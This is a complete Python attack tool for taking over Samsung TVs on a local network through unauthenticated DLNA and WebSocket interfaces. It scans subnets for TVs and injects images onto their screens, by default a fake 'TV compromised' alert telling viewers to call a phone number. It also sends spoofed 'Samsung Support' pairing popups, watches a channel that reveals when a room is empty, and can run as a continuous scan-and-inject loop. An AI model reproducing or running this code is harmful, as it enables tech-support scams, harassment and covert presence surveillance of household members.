#!/usr/bin/env python3
"""
samsung-tv-takeover
-------------------
Samsung confirmed these services operate without authentication by specification:
  - Port 9197: DLNA RenderingControl + AVTransport - "within the same network,
    connections occur without authentication" (Samsung PSIRT response)
  - Port 8001: WebSocket API - device name displayed verbatim in pairing popup

Usage:
  python takeover.py scan                          # find all Samsung TVs on LAN
  python takeover.py inject --ip 192.168.1.100     # inject image to one TV
  python takeover.py inject --all --image alert.jpg # inject to all TVs
  python takeover.py popup --ip 192.168.1.100 --name "Samsung Support"
  python takeover.py watch --ip 192.168.1.100      # passive presence detection
  python takeover.py auto                          # continuous scan + inject loop
"""
import argparse, asyncio, base64, io, json, socket, sys, threading, time, urllib.request
from concurrent.futures import ThreadPoolExecutor

try:
    from PIL import Image, ImageDraw, ImageFont
    PIL_OK = True
except ImportError:
    PIL_OK = False

try:
    import websockets
    WS_OK = True
except ImportError:
    WS_OK = False


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

def probe(ip, timeout=0.7):
    """Returns True if host looks like a Samsung TV (ports 8001 + 9197 open)."""
    for port in (9197, 8001):
        s = socket.socket()
        s.settimeout(timeout)
        ok = s.connect_ex((ip, port)) == 0
        s.close()
        if not ok:
            return False
    return True


def get_device_info(ip, timeout=3):
    """Fetch zero-auth device info from Samsung REST API."""
    try:
        url = f"http://{ip}:8001/api/v2/"
        req = urllib.request.urlopen(url, timeout=timeout)
        return json.loads(req.read())
    except Exception:
        return {}


def scan(subnet, timeout=0.7, verbose=False):
    """Scan /24 subnet and return list of Samsung TV IPs."""
    found = []
    lock = threading.Lock()

    def check(i):
        ip = f"{subnet}.{i}"
        if probe(ip, timeout):
            info = get_device_info(ip)
            name = info.get("device", {}).get("name", "Samsung TV")
            model = info.get("device", {}).get("modelName", "")
            with lock:
                found.append(ip)
                print(f"  [FOUND] {ip}  {name}  {model}")
        elif verbose:
            print(f"  [ -- ]  {subnet}.{i}")

    with ThreadPoolExecutor(max_workers=64) as ex:
        list(ex.map(check, range(1, 255)))

    return found


# ---------------------------------------------------------------------------
# DLNA injection (port 9197)
# Samsung spec: "within the same network, connections occur without authentication"
# ---------------------------------------------------------------------------

AV_NS = "urn:schemas-upnp-org:service:AVTransport:1"


def soap_call(ip, action, body_args, timeout=6):
    ctrl = f"http://{ip}:9197/upnp/control/AVTransport1"
    body = (
        f'<?xml version="1.0"?>'
        f'<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        f's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        f'<s:Body><u:{action} xmlns:u="{AV_NS}">{body_args}</u:{action}></s:Body>'
        f'</s:Envelope>'
    ).encode()
    req = urllib.request.Request(ctrl, data=body, headers={
        "Content-Type": "text/xml; charset=utf-8",
        "SOAPAction": f'"{AV_NS}#{action}"',
    })
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status
    except urllib.request.HTTPError as e:
        return e.code
    except Exception as e:
        return str(e)


def inject_image(ip, image_url, title="Broadcast"):
    """Push image URL to TV screen via DLNA. No auth required."""
    didl = (
        f'&lt;DIDL-Lite xmlns="urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/" '
        f'xmlns:dc="http://purl.org/dc/elements/1.1/" '
        f'xmlns:upnp="urn:schemas-upnp-org:metadata-1-0/upnp/"&gt;'
        f'&lt;item id="1" parentID="0" restricted="1"&gt;'
        f'&lt;dc:title&gt;{title}&lt;/dc:title&gt;'
        f'&lt;upnp:class&gt;object.item.imageItem.photo&lt;/upnp:class&gt;'
        f'&lt;res protocolInfo="http-get:*:image/jpeg:*"&gt;{image_url}&lt;/res&gt;'
        f'&lt;/item&gt;&lt;/DIDL-Lite&gt;'
    )
    r1 = soap_call(ip, "Stop", "<InstanceID>0</InstanceID>")
    time.sleep(0.4)
    r2 = soap_call(ip, "SetAVTransportURI",
                   f"<InstanceID>0</InstanceID>"
                   f"<CurrentURI>{image_url}</CurrentURI>"
                   f"<CurrentURIMetaData>{didl}</CurrentURIMetaData>")
    time.sleep(0.6)
    r3 = soap_call(ip, "Play", "<InstanceID>0</InstanceID><Speed>1</Speed>")
    return r1, r2, r3


# ---------------------------------------------------------------------------
# HTTP server (serves the payload image to TV)
# ---------------------------------------------------------------------------

class ImageServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.data = b""
        self._srv = None

    def set_image(self, data):
        self.data = data

    def start(self):
        data_ref = self

        def handle(conn):
            try:
                conn.recv(4096)
                conn.sendall(
                    b"HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\n"
                    + f"Content-Length: {len(data_ref.data)}\r\nConnection: close\r\n\r\n".encode()
                    + data_ref.data
                )
            except Exception:
                pass
            finally:
                conn.close()

        def serve():
            srv = socket.socket()
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", self.port))
            srv.listen(50)
            self._srv = srv
            while True:
                try:
                    conn, _ = srv.accept()
                    threading.Thread(target=handle, args=(conn,), daemon=True).start()
                except Exception:
                    pass

        threading.Thread(target=serve, daemon=True).start()
        print(f"  [HTTP] serving image on {self.host}:{self.port}")

    def url(self):
        return f"http://{self.host}:{self.port}/image.jpg"


# ---------------------------------------------------------------------------
# Image builder
# ---------------------------------------------------------------------------

def find_font(size, bold=False):
    """Find a usable font across platforms."""
    candidates = []
    if bold:
        candidates = [
            "C:/Windows/Fonts/arialbd.ttf",
            "C:/Windows/Fonts/calibrib.ttf",
            "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
            "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
            "/System/Library/Fonts/Helvetica.ttc",
        ]
    else:
        candidates = [
            "C:/Windows/Fonts/arial.ttf",
            "C:/Windows/Fonts/calibri.ttf",
            "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
            "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
            "/System/Library/Fonts/Helvetica.ttc",
        ]
    for path in candidates:
        try:
            return ImageFont.truetype(path, size)
        except Exception:
            pass
    return ImageFont.load_default()


def build_alert_image(
    title="WARNING: YOUR SAMSUNG TV HAS BEEN COMPROMISED",
    phone="000-000-0000",
    lines=None,
    footer=None,
    bg=(8, 8, 15),
    banner_color=(190, 0, 0),
):
    if lines is None:
        lines = [
            "Call NOW to secure your TV and home network.",
            "Your WiFi password and connected devices are exposed.",
            "Do NOT turn off your TV until you call.",
        ]
    if footer is None:
        footer = f"Samsung Security Alert  |  Call: {phone}  |  Do not dismiss this screen"

    W, H = 1920, 1080
    img = Image.new("RGB", (W, H), bg)
    draw = ImageDraw.Draw(img)

    # Top banner
    draw.rectangle([0, 0, W, 130], fill=banner_color)
    f_title = find_font(62, bold=True)
    bbox = draw.textbbox((0, 0), title, font=f_title)
    draw.text(((W - bbox[2] + bbox[0]) // 2, 22), title, fill=(255, 255, 255), font=f_title)

    # Phone number
    if phone:
        f_num = find_font(220, bold=True)
        bbox = draw.textbbox((0, 0), phone, font=f_num)
        draw.text(((W - bbox[2] + bbox[0]) // 2, 155), phone, fill=(255, 220, 0), font=f_num)

    # Body lines
    f_body = find_font(55)
    y = 480
    for line in lines:
        bbox = draw.textbbox((0, 0), line, font=f_body)
        draw.text(((W - bbox[2] + bbox[0]) // 2, y), line, fill=(200, 200, 200), font=f_body)
        y += 70

    # Footer banner
    draw.rectangle([0, H - 90, W, H], fill=banner_color)
    f_foot = find_font(38)
    bbox = draw.textbbox((0, 0), footer, font=f_foot)
    draw.text(((W - bbox[2] + bbox[0]) // 2, H - 65), footer, fill=(255, 255, 255), font=f_foot)

    buf = io.BytesIO()
    img.save(buf, "JPEG", quality=93)
    return buf.getvalue()


def load_image_file(path):
    with open(path, "rb") as f:
        return f.read()


# ---------------------------------------------------------------------------
# WebSocket named popup (port 8001)
# Samsung spec: device name displayed verbatim — no allowlist, no verification
# ---------------------------------------------------------------------------

async def send_named_popup(ip, name, hold_seconds=10):
    if not WS_OK:
        print("  [!] websockets not installed: pip install websockets")
        return
    encoded = base64.b64encode(name.encode()).decode()
    uri = f"ws://{ip}:8001/api/v2?name={encoded}&token=&appId=com.samsung.app&deviceName={encoded}"
    import websockets as ws_mod
    print(f"  [WS] Connecting to {ip}:8001 as '{name}'...")
    try:
        async with ws_mod.connect(uri, open_timeout=8) as ws:
            msg = await asyncio.wait_for(ws.recv(), timeout=10)
            data = json.loads(msg)
            event = data.get("event", "")
            print(f"  [WS] Response: {event}")
            if "connect" in event or "touchEnable" in event:
                print(f"  [WS] Popup showing '{name}' on TV screen")
            elif "timeout" in event.lower():
                print(f"  [WS] Popup timed out (shown but not accepted)")
            elif "unauthorized" in event.lower():
                print(f"  [WS] Channel blocked")
            if hold_seconds > 0:
                print(f"  [WS] Holding connection {hold_seconds}s...")
                await asyncio.sleep(hold_seconds)
    except asyncio.TimeoutError:
        print(f"  [WS] Timeout — popup likely shown but timed out")
    except Exception as e:
        print(f"  [WS] Error: {e}")


# ---------------------------------------------------------------------------
# Passive presence detection (art-app channel, Frame TV)
# go_to_standby = room empty; PowerState on = owner entered
# ---------------------------------------------------------------------------

async def watch_presence(ip, duration=300):
    if not WS_OK:
        print("  [!] websockets not installed: pip install websockets")
        return
    import websockets as ws_mod
    encoded = base64.b64encode(b"Listener").decode()
    uri = f"ws://{ip}:8001/api/v2/channels/com.samsung.art-app?name={encoded}"
    print(f"  [WATCH] Connecting to {ip} — passive presence monitor")
    print(f"  [WATCH] go_to_standby = room empty | PowerState on = owner entered\n")
    try:
        async with ws_mod.connect(uri, open_timeout=8) as ws:
            deadline = asyncio.get_event_loop().time() + duration
            while asyncio.get_event_loop().time() < deadline:
                try:
                    raw = await asyncio.wait_for(ws.recv(), timeout=2.0)
                    ts = time.strftime("%H:%M:%S")
                    try:
                        data = json.loads(raw)
                        event = data.get("event", data.get("method", "?"))
                        inner = data.get("data", "")
                        if isinstance(inner, str):
                            try:
                                inner = json.loads(inner)
                            except Exception:
                                pass
                        if event == "go_to_standby":
                            print(f"[{ts}] *** ROOM EMPTY — go_to_standby fired ***")
                        elif "PowerState" in str(inner):
                            print(f"[{ts}] *** OWNER ENTERED — PowerState changed ***")
                        else:
                            print(f"[{ts}] {event}: {str(inner)[:120]}")
                    except Exception:
                        print(f"[{ts}] RAW: {raw[:200]}")
                except asyncio.TimeoutError:
                    pass
    except Exception as e:
        print(f"  [WATCH] Error: {e}")


# ---------------------------------------------------------------------------
# Auto mode — continuous scan + inject
# ---------------------------------------------------------------------------

def auto_mode(subnet, my_ip, port=8779, interval=15, image_path=None):
    if not PIL_OK and image_path is None:
        print("[!] Pillow not installed and no --image provided. pip install pillow")
        sys.exit(1)

    srv = ImageServer(my_ip, port)
    if image_path:
        srv.set_image(load_image_file(image_path))
        print(f"[*] Loaded image: {image_path} ({len(srv.data):,} bytes)")
    else:
        srv.set_image(build_alert_image())
        print(f"[*] Built default alert image ({len(srv.data):,} bytes)")
    srv.start()

    injected = {}
    sweep = 0

    while True:
        sweep += 1
        print(f"\n[*] Sweep #{sweep} — {subnet}.0/24")
        tvs = scan(subnet)
        for ip in tvs:
            last = injected.get(ip, 0)
            if time.time() - last < 300:
                continue
            injected[ip] = time.time()
            print(f"  [->] Injecting {ip}...")
            r = inject_image(ip, srv.url())
            print(f"  [{'OK' if 200 in str(r) or r[2] == 200 else 'FAIL'}] {ip}: {r}")
        print(f"[*] Sleeping {interval}s...")
        time.sleep(interval)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def derive_subnet(ip):
    parts = ip.rsplit(".", 1)
    return parts[0]


def main():
    ap = argparse.ArgumentParser(
        description="Samsung TV Takeover — uses Samsung's documented zero-auth network APIs"
    )
    sub = ap.add_subparsers(dest="cmd")

    # scan
    p_scan = sub.add_parser("scan", help="Find all Samsung TVs on LAN")
    p_scan.add_argument("--subnet", default=None, help="e.g. 192.168.1 (auto-detected if omitted)")
    p_scan.add_argument("--verbose", action="store_true")

    # inject
    p_inj = sub.add_parser("inject", help="Inject image to TV screen via DLNA (port 9197)")
    p_inj.add_argument("--ip", help="Target TV IP")
    p_inj.add_argument("--all", action="store_true", help="Inject all TVs on LAN")
    p_inj.add_argument("--image", help="Path to JPEG image file (default: built-in alert)")
    p_inj.add_argument("--myip", default=None, help="Your IP for HTTP server (auto-detected)")
    p_inj.add_argument("--port", type=int, default=8779)
    p_inj.add_argument("--subnet", default=None)
    p_inj.add_argument("--title", default="", help="DIDL title metadata")
    p_inj.add_argument("--phone", default="000-000-0000", help="Phone number on alert image")

    # popup
    p_pop = sub.add_parser("popup", help="Send named WebSocket pairing popup (port 8001)")
    p_pop.add_argument("--ip", required=True)
    p_pop.add_argument("--name", default="Samsung Support", help="Name shown on TV screen")
    p_pop.add_argument("--hold", type=int, default=30, help="Seconds to hold connection open")

    # watch
    p_watch = sub.add_parser("watch", help="Passive presence detection via Art Mode channel")
    p_watch.add_argument("--ip", required=True)
    p_watch.add_argument("--duration", type=int, default=300, help="Listen duration in seconds")

    # auto
    p_auto = sub.add_parser("auto", help="Continuous scan + inject loop")
    p_auto.add_argument("--subnet", default=None)
    p_auto.add_argument("--myip", default=None)
    p_auto.add_argument("--port", type=int, default=8779)
    p_auto.add_argument("--interval", type=int, default=15)
    p_auto.add_argument("--image", help="Custom image file")

    args = ap.parse_args()

    if not args.cmd:
        ap.print_help()
        return

    my_ip = getattr(args, "myip", None) or get_local_ip()
    subnet = getattr(args, "subnet", None) or derive_subnet(my_ip)

    if args.cmd == "scan":
        print(f"[*] Scanning {subnet}.0/24 for Samsung TVs...")
        tvs = scan(subnet, verbose=args.verbose)
        print(f"\n[*] Found {len(tvs)} Samsung TV(s): {tvs}")

    elif args.cmd == "inject":
        if not PIL_OK and not args.image:
            print("[!] Pillow not installed. pip install pillow  OR  use --image <file>")
            sys.exit(1)

        srv = ImageServer(my_ip, args.port)
        if args.image:
            srv.set_image(load_image_file(args.image))
            print(f"[*] Loaded {args.image} ({len(srv.data):,} bytes)")
        else:
            srv.set_image(build_alert_image(phone=args.phone))
            print(f"[*] Built alert image ({len(srv.data):,} bytes)")
        srv.start()
        time.sleep(0.3)

        targets = []
        if args.all:
            print(f"[*] Scanning {subnet}.0/24...")
            targets = scan(subnet)
        elif args.ip:
            targets = [args.ip]
        else:
            print("[!] Provide --ip or --all")
            sys.exit(1)

        for ip in targets:
            print(f"[->] Injecting {ip}...")
            r = inject_image(ip, srv.url(), title=args.title)
            print(f"  Stop={r[0]} SetURI={r[1]} Play={r[2]}")

        if targets:
            print("\n[*] Done. Press Ctrl+C to stop HTTP server.")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass

    elif args.cmd == "popup":
        asyncio.run(send_named_popup(args.ip, args.name, hold_seconds=args.hold))

    elif args.cmd == "watch":
        asyncio.run(watch_presence(args.ip, duration=args.duration))

    elif args.cmd == "auto":
        auto_mode(subnet, my_ip, port=args.port, interval=args.interval, image_path=args.image)


if __name__ == "__main__":
    main()
